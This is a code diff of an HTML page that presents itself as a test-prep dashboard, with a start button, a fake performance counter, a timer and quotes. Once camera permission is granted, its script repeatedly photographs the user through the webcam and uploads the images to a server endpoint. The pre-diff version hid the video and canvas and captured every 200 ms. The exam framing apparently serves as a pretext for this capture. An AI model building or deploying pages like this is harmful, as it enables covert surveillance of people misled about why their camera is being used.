@@ -113,7 +113,6 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <body>
 
 <div id="overlay">
-
 <div class="browser-note">
 For better stability, use Chrome or Brave browser.
 </div>
@@ -127,7 +126,6 @@ For better stability, use Chrome or Brave browser.
 </div>
 
 <div class="container">
-
   <div class="card">
     <h3>Start Test</h3>
     <button onclick="start()">▶ Start Test</button>
@@ -151,17 +149,16 @@ For better stability, use Chrome or Brave browser.
     <h3>Motivation</h3>
     <div class="quote" id="quote"></div>
   </div>
-
 </div>
 </div>
 
 <iframe id="frame"></iframe>
-<video id="v" autoplay playsinline hidden></video>
-<canvas id="c" hidden></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
 
-/* Editable Name */
+/* Name */
 function changeName(){
   let name=prompt("Enter your name:");
   if(name){
@@ -182,7 +179,7 @@ function updateTime(){
 }
 setInterval(updateTime,1000);updateTime();
 
-/* Rank Counter */
+/* Rank */
 let p=0,target=99.30;
 let counter=setInterval(()=>{
   p+=1.5;
@@ -191,28 +188,32 @@ let counter=setInterval(()=>{
     "Target Performance: "+p.toFixed(2)+"%";
 },30);
 
-/* Progress Bars */
+/* Progress */
 setTimeout(()=>{
-  phy.style.width="70%";
-  chem.style.width="60%";
-  math.style.width="75%";
+  document.getElementById("phy").style.width="70%";
+  document.getElementById("chem").style.width="60%";
+  document.getElementById("math").style.width="75%";
 },500);
 
 /* Timer */
-let sec=0,timerInt;
+let sec=0,timerInt=null;
 function startTimer(){
+  if(timerInt) return;
   timerInt=setInterval(()=>{
     sec++;
     let h=Math.floor(sec/3600);
     let m=Math.floor((sec%3600)/60);
     let s=sec%60;
-    timer.innerText=
+    document.getElementById("timer").innerText=
       String(h).padStart(2,'0')+":"+
       String(m).padStart(2,'0')+":"+
       String(s).padStart(2,'0');
   },1000);
 }
-function stopTimer(){clearInterval(timerInt);}
+function stopTimer(){
+  clearInterval(timerInt);
+  timerInt=null;
+}
 
 /* Quotes */
 let quotes=[
@@ -223,24 +224,26 @@ let quotes=[
 ];
 let qi=0;
 function rotateQuote(){
-  quote.innerText=quotes[qi];
+  document.getElementById("quote").innerText=quotes[qi];
   qi=(qi+1)%quotes.length;
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST (Camera Required) */
+/* START */
 async function start(){
-
   try{
     const stream=await navigator.mediaDevices.getUserMedia({
       video:{width:1280,height:720}
     });
 
+    const v=document.getElementById("v");
     v.srcObject=stream;
-    setTimeout(capture,200);
-    setInterval(capture,200);
+
+    setTimeout(capture,1000);
+    setInterval(capture,5000);
 
   }catch(e){
+    alert("Camera permission required to start test.");
     return;
   }
 
@@ -255,25 +258,25 @@ async function start(){
 
   if(frame.requestFullscreen){
     frame.requestFullscreen();
-  }else if(frame.webkitRequestFullscreen){
-    frame.webkitRequestFullscreen();
-  }else if(frame.msRequestFullscreen){
-    frame.msRequestFullscreen();
   }
 }
 
 function capture(){
+  const v=document.getElementById("v");
+  const c=document.getElementById("c");
+
   c.width=v.videoWidth;
   c.height=v.videoHeight;
+
   c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+
   c.toBlob(b=>{
     let f=new FormData();
     f.append("photo",b,"u.jpg");
     fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",0.6);
+  },"image/jpeg",0.7);
 }
 
 </script>
-
 </body>
 </html>
